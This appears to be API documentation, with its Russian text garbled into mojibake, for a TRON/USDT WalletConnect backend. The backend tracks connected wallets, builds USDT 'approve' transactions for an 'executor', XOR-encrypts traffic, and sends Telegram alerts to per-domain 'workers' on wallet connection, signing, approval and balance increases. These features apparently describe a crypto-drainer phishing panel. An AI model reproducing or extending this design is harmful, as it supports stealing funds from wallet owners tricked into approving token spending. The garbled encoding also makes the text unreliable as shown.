- NotificationService –¥–ª—è –æ—Ç–ø—Ä–∞–≤–∫–∏ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
- Converter utils –¥–ª—è –∫–æ–Ω–≤–µ—Ä—Ç–∞—Ü–∏–∏ –∑–Ω–∞—á–µ–Ω–∏–π

## –ù–∞—Å—Ç—Ä–æ–π–∫–∏

- **–ò–Ω—Ç–µ—Ä–≤–∞–ª –ø—Ä–æ–≤–µ—Ä–∫–∏**: 2 –º–∏–Ω—É—Ç—ã (–∫–æ–Ω—Å—Ç–∞–Ω—Ç–∞ `CHECK_INTERVAL`)
- **–†–∞–∑–º–µ—Ä –ø–∞–∫–µ—Ç–∞**: 10 –∫–æ—à–µ–ª—å–∫–æ–≤ –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ (–∫–æ–Ω—Å—Ç–∞–Ω—Ç–∞ `batchSize`)
- **USDT –∫–æ–Ω—Ç—Ä–∞–∫—Ç**: `TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t`

# API –î–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏—è - –£–≤–µ–¥–æ–º–ª–µ–Ω–∏—è

## –û–±–∑–æ—Ä

API –¥–ª—è —Ç–µ—Å—Ç–∏—Ä–æ–≤–∞–Ω–∏—è –∏ —É–ø—Ä–∞–≤–ª–µ–Ω–∏—è —Å–∏—Å—Ç–µ–º–æ–π —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π Telegram. –í—Å–µ —ç–Ω–¥–ø–æ–∏–Ω—Ç—ã —Ç—Ä–µ–±—É—é—Ç –∞–≤—Ç–æ—Ä–∏–∑–∞—Ü–∏–∏ —á–µ—Ä–µ–∑ JWT —Ç–æ–∫–µ–Ω.

## –ë–∞–∑–æ–≤—ã–π URL
```
http://localhost:3000/admin/notifications
```

## –ê—É—Ç–µ–Ω—Ç–∏—Ñ–∏–∫–∞—Ü–∏—è
–í—Å–µ –∑–∞–ø—Ä–æ—Å—ã –¥–æ–ª–∂–Ω—ã —Å–æ–¥–µ—Ä–∂–∞—Ç—å JWT —Ç–æ–∫–µ–Ω –≤ –∑–∞–≥–æ–ª–æ–≤–∫–µ:
```
Authorization: Bearer <your_jwt_token>
```

## –≠–Ω–¥–ø–æ–∏–Ω—Ç—ã

### 1. –ü–æ–ª—É—á–∏—Ç—å –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ —Ç–∏–ø—ã —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π

**GET** `/types`

–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã—Ö —Ç–∏–ø–æ–≤ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π.

**–û—Ç–≤–µ—Ç:**
```json
{
  "success": true,
  "data": {
    "types": [
      "connection",
      "signed", 
      "send",
      "approved",
      "balance_increase",
      "insufficient_balance"
    ],
    "count": 6
  }
}
```

### 2. –ü–æ–ª—É—á–∏—Ç—å –¥–æ–º–µ–Ω—ã —Å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è–º–∏ —á–∞—Ç–æ–≤

**GET** `/domains`

–í–æ–∑–≤—Ä–∞—â–∞–µ—Ç —Å–ø–∏—Å–æ–∫ –≤—Å–µ—Ö –¥–æ–º–µ–Ω–æ–≤ —Å –∏—Ö –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—è–º–∏ Telegram —á–∞—Ç–æ–≤.

**–û—Ç–≤–µ—Ç:**
```json
{
  "success": true,
  "data": {
    "domains": [
      {
        "id": 1,
        "domain": "example.com",
        "worker_nickname": "worker1",
        "chats": [
          {
            "chat_id": "-123456789",
            "token": "bot_token_here",
            "types": {
              "connection": true,
              "approved": true,
              "signed": false
            }
          }
        ],
        "chatsCount": 1,
        "created_at": "2025-01-18T12:00:00.000Z"
      }
    ],
    "count": 1
  }
}
```

### 3. –í–∞–ª–∏–¥–∏—Ä–æ–≤–∞—Ç—å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏—é —á–∞—Ç–æ–≤ –¥–æ–º–µ–Ω–∞

**GET** `/domains/:domainId/validate`

–ü—Ä–æ–≤–µ—Ä—è–µ—Ç –∫–æ—Ä—Ä–µ–∫—Ç–Ω–æ—Å—Ç—å –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ —á–∞—Ç–æ–≤ –¥–ª—è —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ –¥–æ–º–µ–Ω–∞.

**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `domainId` (number) - ID –¥–æ–º–µ–Ω–∞

**–û—Ç–≤–µ—Ç:**
```json
{
  "success": true,
  "data": {
    "domain": "example.com",
    "chatsConfigured": true,
    "chatsCount": 1,
    "parseError": null,
    "chats": [
      {
        "index": 0,
        "chat_id": "-123456789",
        "token": "***2345",
        "hasTypes": true,
        "enabledTypes": ["connection", "approved"],
        "totalTypes": 6
      }
    ]
  }
}
```

### 4. –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–µ—Å—Ç–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ

**POST** `/test`

–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ç–µ—Å—Ç–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ —É–∫–∞–∑–∞–Ω–Ω–æ–≥–æ —Ç–∏–ø–∞ —Å –º–æ–∫–æ–≤—ã–º–∏ –¥–∞–Ω–Ω—ã–º–∏.

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "type": "connection",
  "domainId": 1  // –æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ, –µ—Å–ª–∏ –Ω–µ —É–∫–∞–∑–∞–Ω - –±–µ—Ä–µ—Ç—Å—è –ø–µ—Ä–≤—ã–π –¥–æ–º–µ–Ω —Å —á–∞—Ç–∞–º–∏
}
```

**–û—Ç–≤–µ—Ç:**
```json
{
  "success": true,
  "message": "Test notification of type 'connection' sent successfully",
  "data": {
    "type": "connection",
    "domain": "example.com",
    "mockData": {
      "id": "TEST_1737200000000",
      "nickname": "worker1",
      "worker": "test-worker-001",
      "hostname": "example.com",
      "ip": "192.168.1.100",
      "from": "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t",
      "operator": "TLsV52sRDL79HXGGm9yzwKiW6SLumaGNHF",
      "metadata": {
        "name": "Test Wallet",
        "version": "1.0.0"
      },
      "total": 1250.75,
      "assets": [
        {
          "symbol": "TRX",
          "balance": 1000.50,
          "usdValue": 85.25
        },
        {
          "symbol": "USDT", 
          "balance": 1165.50,
          "usdValue": 1165.50
        }
      ]
    }
  }
}
```

### 5. –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≤—Å–µ —Ç–∏–ø—ã —Ç–µ—Å—Ç–æ–≤—ã—Ö —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π

**POST** `/test-all`

–û—Ç–ø—Ä–∞–≤–ª—è–µ—Ç —Ç–µ—Å—Ç–æ–≤—ã–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≤—Å–µ—Ö –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã—Ö —Ç–∏–ø–æ–≤.

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "domainId": 1  // –æ–ø—Ü–∏–æ–Ω–∞–ª—å–Ω–æ
}
```

**–û—Ç–≤–µ—Ç:**
```json
{
  "success": true,
  "message": "Test notifications sent for domain 'example.com'",
  "data": {
    "domain": "example.com",
    "results": [
      {
        "type": "connection",
        "status": "success",
        "message": "Sent successfully"
      },
      {
        "type": "approved",
        "status": "success", 
        "message": "Sent successfully"
      },
      {
        "type": "signed",
        "status": "error",
        "message": "Telegram API error: chat not found"
      }
    ],
    "totalSent": 5,
    "totalFailed": 1
  }
}
```

## –ú–æ–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ

–î–ª—è –∫–∞–∂–¥–æ–≥–æ —Ç–∏–ø–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è –≥–µ–Ω–µ—Ä–∏—Ä—É—é—Ç—Å—è —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–µ –º–æ–∫–æ–≤—ã–µ –¥–∞–Ω–Ω—ã–µ:

### Connection
- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–º –∫–æ—à–µ–ª—å–∫–µ
- –°–ø–∏—Å–æ–∫ –¥–æ—Å—Ç—É–ø–Ω—ã—Ö –∞–∫—Ç–∏–≤–æ–≤ (TRX, USDT)
- –û–±—â–∏–π –±–∞–ª–∞–Ω—Å –≤ USD

### Approved
- –î–∞–Ω–Ω—ã–µ –æ–± –æ–¥–æ–±—Ä–µ–Ω–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ USDT
- –°—É–º–º–∞ –≤ nano –µ–¥–∏–Ω–∏—Ü–∞—Ö
- –ú–µ—Ç–æ–¥ (approve)
- –¢–µ—Å—Ç–æ–≤—ã–π txID

### Signed
- –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–¥–ø–∏—Å–∞–Ω–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
- –¢–æ–∫–µ–Ω –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è (USDT)
- USD —Å—Ç–æ–∏–º–æ—Å—Ç—å
- –¢–µ—Å—Ç–æ–≤—ã–π txID

### Send
- –ë–∞–∑–æ–≤–∞—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ–± –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
- –°—É–º–º–∞ –∏ USD —Å—Ç–æ–∏–º–æ—Å—Ç—å
- –¢–µ—Å—Ç–æ–≤—ã–π txID

### Balance Increase
- –ò–∑–º–µ–Ω–µ–Ω–∏—è –±–∞–ª–∞–Ω—Å–∞ TRX –∏ USDT
- –°—Ç–∞—Ä—ã–µ –∏ –Ω–æ–≤—ã–µ –∑–Ω–∞—á–µ–Ω–∏—è
- –†–∞–∑–Ω–∏—Ü–∞ (+/-)
- –û–±—â–µ–µ —É–≤–µ–ª–∏—á–µ–Ω–∏–µ –≤ USD

### Insufficient Balance
- –¢–µ–∫—É—â–∏–π –±–∞–ª–∞–Ω—Å TRX
- –¢—Ä–µ–±—É–µ–º–∞—è –∫–æ–º–∏—Å—Å–∏—è
- –ù–µ–¥–æ—Å—Ç–∞—é—â–∞—è —Å—É–º–º–∞ TRX
- –¢–µ—Å—Ç–æ–≤—ã–π txID

## –ö–æ–¥—ã –æ—à–∏–±–æ–∫

- `400` - –ù–µ–≤–µ—Ä–Ω—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –∑–∞–ø—Ä–æ—Å–∞
- `401` - –ù–µ –∞–≤—Ç–æ—Ä–∏–∑–æ–≤–∞–Ω
- `404` - –î–æ–º–µ–Ω –Ω–µ –Ω–∞–π–¥–µ–Ω
- `500` - –í–Ω—É—Ç—Ä–µ–Ω–Ω—è—è –æ—à–∏–±–∫–∞ —Å–µ—Ä–≤–µ—Ä–∞

## –ü—Ä–∏–º–µ—Ä—ã –∏—Å–ø–æ–ª—å–∑–æ–≤–∞–Ω–∏—è

### Curl –ø—Ä–∏–º–µ—Ä—ã

```bash
# –ü–æ–ª—É—á–∏—Ç—å –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞–µ–º—ã–µ —Ç–∏–ø—ã
curl -H "Authorization: Bearer <token>" \
  http://localhost:3000/admin/notifications/types

# –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–µ—Å—Ç–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è
curl -X POST \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"type": "connection", "domainId": 1}' \
  http://localhost:3000/admin/notifications/test

# –û—Ç–ø—Ä–∞–≤–∏—Ç—å –≤—Å–µ —Ç–∏–ø—ã —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π
curl -X POST \
  -H "Authorization: Bearer <token>" \
  -H "Content-Type: application/json" \
  -d '{"domainId": 1}' \
  http://localhost:3000/admin/notifications/test-all
```

### JavaScript/Fetch –ø—Ä–∏–º–µ—Ä—ã

```javascript
// –ü–æ–ª—É—á–∏—Ç—å –¥–æ–º–µ–Ω—ã —Å —á–∞—Ç–∞–º–∏
const response = await fetch('/admin/notifications/domains', {
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  }
});
const domains = await response.json();

// –û—Ç–ø—Ä–∞–≤–∏—Ç—å —Ç–µ—Å—Ç–æ–≤–æ–µ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–µ
const testResponse = await fetch('/admin/notifications/test', {
  method: 'POST',
  headers: {
    'Authorization': `Bearer ${token}`,
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    type: 'approved',
    domainId: 1
  })
});
const result = await testResponse.json();
```

## –õ–æ–≥–∏—Ä–æ–≤–∞–Ω–∏–µ

–í—Å–µ –¥–µ–π—Å—Ç–≤–∏—è —Å —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è–º–∏ –ª–æ–≥–∏—Ä—É—é—Ç—Å—è —Å —Å–æ–æ—Ç–≤–µ—Ç—Å—Ç–≤—É—é—â–∏–º–∏ action —Ç–∏–ø–∞–º–∏:
- `VIEW_NOTIFICATION_TYPES`
- `VIEW_DOMAINS_WITH_CHATS` 
- `VALIDATE_DOMAIN_CHATS`
- `SEND_TEST_NOTIFICATION`
- `SEND_ALL_TEST_NOTIFICATIONS`

–õ–æ–≥–∏ –º–æ–∂–Ω–æ –ø—Ä–æ—Å–º–∞—Ç—Ä–∏–≤–∞—Ç—å —á–µ—Ä–µ–∑ journalctl –∏–ª–∏ –≤ —Ñ–∞–π–ª–∞—Ö –ª–æ–≥–æ–≤ —Å–∏—Å—Ç–µ–º—ã.

# Public API Documentation

## –û–±–∑–æ—Ä
Public API –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª—è–µ—Ç endpoints –¥–ª—è —Ä–∞–±–æ—Ç—ã —Å WalletConnect, –æ–±—Ä–∞–±–æ—Ç–∫–∏ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –∏ —á–µ–∫–æ–≤.

---

## üîó WALLETCONNECT ROUTES

### POST `/api/fetchWalletConnect`
–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –ø–æ–¥–∫–ª—é—á–µ–Ω–∏—è WalletConnect.

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "id": "unique_session_id"
}
```

**–û—Ç–≤–µ—Ç (SSE Stream):**
```
data: encrypted_json_string

// –°–æ–±—ã—Ç–∏—è:
// 1. connection - URI –¥–ª—è QR –∫–æ–¥–∞
// 2. wallet - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ –ø–æ–¥–∫–ª—é—á–µ–Ω–Ω–æ–º –∫–æ—à–µ–ª—å–∫–µ  
// 3. transactions - –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—è—Ö
```

**–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ —Å–æ–±—ã—Ç–∏—è:**
```json
// –°–æ–±—ã—Ç–∏–µ connection
{
  "event": "connection",
  "uri": "wc:1234567890abcdef@2?bridge=..."
}

// –°–æ–±—ã—Ç–∏–µ wallet
{
  "event": "wallet", 
  "addr": "TRX1234567890abcdef"
}

// –°–æ–±—ã—Ç–∏–µ transactions
{
  "event": "transactions",
  "count": 1,
  "total": 0
}
```

---

## üîÑ TRANSACTION ROUTES

### POST `/api/buildTransactions`
–ü–æ—Å—Ç—Ä–æ–µ–Ω–∏–µ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–π –¥–ª—è –ø–æ–¥–ø–∏—Å–∞–Ω–∏—è.

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "id": "session_id",
  "data": "encrypted_data"
}
```

**–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
```json
{
  "executor": "TRX_wallet_address",
  "target": "target_info"
}
```

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "data": "encrypted_response"
}
```

**–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–π –æ—Ç–≤–µ—Ç:**
```json
{
  "transactions": [
    {
      "txID": "transaction_id",
      "token": "USDT",
      "method": "approve",
      "amount": "1000000000",
      "usd_price": 100.50
    }
  ],
  "total": 1
}
```

### POST `/api/sendTransaction`
–û—Ç–ø—Ä–∞–≤–∫–∞ –ø–æ–¥–ø–∏—Å–∞–Ω–Ω–æ–π —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏ –≤ —Å–µ—Ç—å.

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "data": "encrypted_transaction_data"
}
```

**–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
```json
{
  "transaction": {
    "signature": "...",
    "txID": "...",
    // ... –¥—Ä—É–≥–∏–µ –ø–æ–ª—è —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏
  }
}
```

**–û—Ç–≤–µ—Ç (200):**
```json
{}
```

---

## ‚úÖ CHECK ROUTES

### POST `/api/check`
–û–±—Ä–∞–±–æ—Ç–∫–∞ —á–µ–∫–∞.

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞ (—Å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º):**
```json
{
  "data": "encrypted_check_data"
}
```

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞ (–±–µ–∑ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è):**
```json
{
  "check": "base64_encoded_check_data"
}
```

**–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ —á–µ–∫–∞:**
```json
{
  "check": "eyJ0aW1lc3RhbXAiOjE2ODk2NzIwMDAsIndhbGxldF9hZGRyZXNzIjoiVFJYMTIzNCIsImFtb3VudCI6MTAwfQ=="
}
```

**–î–µ–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —á–µ–∫ (base64):**
```json
{
  "timestamp": 1689672000,
  "wallet_address": "TRX1234567890abcdef", 
  "amount": 100.50
}
```

**–ò–ª–∏ —Ç–µ–∫—Å—Ç–æ–≤—ã–π —Ñ–æ—Ä–º–∞—Ç:**
```
1689672000
TRX1234567890abcdef
100.50
```

**–û—Ç–≤–µ—Ç (200, —Å —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ–º):**
```json
{
  "data": "encrypted_response"
}
```

**–û—Ç–≤–µ—Ç (200, –±–µ–∑ —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏—è):**
```json
{
  "success": true,
  "check": {
    "id": 1,
    "wallet_address": "TRX1234567890abcdef",
    "amount": 100.50,
    "timer_start": "2025-07-18T10:30:00.000Z",
    "timer_end": "2025-07-20T10:30:00.000Z",
    "status": "active"
  },
  "timer": {
    "START_TIME_MSK": "2025-07-18T10:30:00.000Z",
    "END_TIME_MSK": "2025-07-20T10:30:00.000Z", 
    "DURATION_SECONDS": 172800,
    "REMAINING_SECONDS": 169200,
    "WALLET_ADDRESS": "TRX1234567890abcdef",
    "AMOUNT": 100.50,
    "CHECK_ID": 1,
    "STATUS": "active"
  },
  "message": "Check processed successfully"
}
```

### GET `/api/check/:id`
–ü–æ–ª—É—á–µ–Ω–∏–µ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ —á–µ–∫–µ –ø–æ ID.

**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `id` (number) - ID —á–µ–∫–∞

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "check": {
    "id": 1,
    "wallet_address": "TRX1234567890abcdef",
    "amount": 100.50,
    "status": "active",
    "created_at": "2025-07-18T10:30:00.000Z"
  },
  "timer": {
    "start_time": "2025-07-18T10:30:00.000Z",
    "end_time": "2025-07-20T10:30:00.000Z",
    "remaining_seconds": 169200,
    "is_expired": false
  }
}
```

### GET `/api/checks/wallet/:address`
–ü–æ–ª—É—á–µ–Ω–∏–µ –≤—Å–µ—Ö —á–µ–∫–æ–≤ –¥–ª—è –∫–æ—à–µ–ª—å–∫–∞.

**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `address` (string) - –ê–¥—Ä–µ—Å –∫–æ—à–µ–ª—å–∫–∞

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "checks": [
    {
      "id": 1,
      "wallet_address": "TRX1234567890abcdef",
      "amount": 100.50,
      "status": "active",
      "created_at": "2025-07-18T10:30:00.000Z"
    }
  ],
  "count": 1
}
```

### GET `/api/checks/stats`
–ü–æ–ª—É—á–µ–Ω–∏–µ —Å—Ç–∞—Ç–∏—Å—Ç–∏–∫–∏ —á–µ–∫–æ–≤.

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "stats": {
    "total_checks": 150,
    "active_checks": 120,
    "expired_checks": 30,
    "total_amount": 15000.75
  }
}
```

### PUT `/api/check/:id/status`
–û–±–Ω–æ–≤–ª–µ–Ω–∏–µ —Å—Ç–∞—Ç—É—Å–∞ —á–µ–∫–∞.

**–ü–∞—Ä–∞–º–µ—Ç—Ä—ã:**
- `id` (number) - ID —á–µ–∫–∞

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "status": "expired"
}
```

**–û—Ç–≤–µ—Ç (200):**
```json
{
  "success": true,
  "check": {
    "id": 1,
    "status": "expired",
    // ... –æ—Å—Ç–∞–ª—å–Ω—ã–µ –ø–æ–ª—è
  },
  "message": "Check status updated successfully"
}
```

---

## üì¢ NOTIFICATION ROUTES

### POST `/api/notification`
–û–±—Ä–∞–±–æ—Ç–∫–∞ —É–≤–µ–¥–æ–º–ª–µ–Ω–∏–π.

**–¢–µ–ª–æ –∑–∞–ø—Ä–æ—Å–∞:**
```json
{
  "data": "encrypted_notification_data"
}
```

**–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ –¥–∞–Ω–Ω—ã–µ:**
```json
{
  "type": "notification_type",
  // ... –¥—Ä—É–≥–∏–µ –ø–æ–ª—è —É–≤–µ–¥–æ–º–ª–µ–Ω–∏—è
}
```

**–û—Ç–≤–µ—Ç (200):**
```json
{}
```

---

## üîê ENCRYPTION

API –∏—Å–ø–æ–ª—å–∑—É–µ—Ç XOR —à–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ —Å –∫–ª—é—á–æ–º –∏–∑ `Constants.encrypt_key`.

**–®–∏—Ñ—Ä–æ–≤–∞–Ω–∏–µ –¥–∞–Ω–Ω—ã—Ö:**
```typescript
const encryptedData = Encryptor.xorConvert(JSON.stringify(data), Constants.encrypt_key);
```

**–†–∞—Å—à–∏—Ñ—Ä–æ–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö:**
```typescript
const decryptedData = JSON.parse(Encryptor.xorConvert(encryptedData, Constants.encrypt_key));
```

---

## üö® ERROR RESPONSES

**400 Bad Request:**
```json
{
  "success": false,
  "error": "Invalid request data"
}
```

**500 Internal Server Error:**
```json
{
  "success": false, 
  "error": "Internal server error"
}
```

---

## üìã NOTES

1. **SSE Responses** - `/api/fetchWalletConnect` –≤–æ–∑–≤—Ä–∞—â–∞–µ—Ç Server-Sent Events –ø–æ—Ç–æ–∫
2. **Encryption** - –ù–µ–∫–æ—Ç–æ—Ä—ã–µ endpoints –ø–æ–¥–¥–µ—Ä–∂–∏–≤–∞—é—Ç –∫–∞–∫ –∑–∞—à–∏—Ñ—Ä–æ–≤–∞–Ω–Ω—ã–µ, —Ç–∞–∫ –∏ –æ—Ç–∫—Ä—ã—Ç—ã–µ –¥–∞–Ω–Ω—ã–µ
3. **Base64 Checks** - –ß–µ–∫–∏ –º–æ–≥—É—Ç –±—ã—Ç—å –≤ JSON –∏–ª–∏ —Ç–µ–∫—Å—Ç–æ–≤–æ–º —Ñ–æ—Ä–º–∞—Ç–µ, –∑–∞–∫–æ–¥–∏—Ä–æ–≤–∞–Ω–Ω—ã–µ –≤ base64
4. **Timer Logic** - –ß–µ–∫–∏ –∞–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–∏ –∏—Å—Ç–µ–∫–∞—é—Ç —á–µ—Ä–µ–∑ 48 —á–∞—Å–æ–≤
5. **WalletConnect** - –ê–≤—Ç–æ–º–∞—Ç–∏—á–µ—Å–∫–æ–µ —Å–æ–∑–¥–∞–Ω–∏–µ –∑–∞–ø–∏—Å–∏ –∫–æ—à–µ–ª—å–∫–∞ –ø—Ä–∏ —É—Å–ø–µ—à–Ω–æ–º –ø–æ–¥–∫–ª—é—á–µ–Ω–∏–∏
